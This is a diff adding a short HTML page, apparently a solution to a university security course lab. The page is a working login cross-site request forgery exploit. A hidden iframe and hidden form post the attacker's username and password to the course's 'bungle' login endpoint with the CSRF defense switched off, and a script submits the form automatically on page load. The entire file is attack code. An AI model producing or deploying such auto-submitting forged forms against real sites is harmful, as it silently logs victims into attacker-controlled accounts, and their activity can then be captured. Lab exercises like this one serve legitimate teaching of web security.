@@ -1,0 +1,12 @@
+<iframe name="hidden_iframe" style="display:none;" width=1 height=1></iframe>
+<form id="attacker_form" action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" method="post"
+  target="hidden_iframe">
+  <input type="hidden" name="username" value="attacker" hidden>
+  <input type="hidden" name="password" value="l33th4x" hidden>
+</form>
+
+<script>
+  window.onload = function () {
+    document.getElementById("attacker_form").submit();
+  }
+</script>
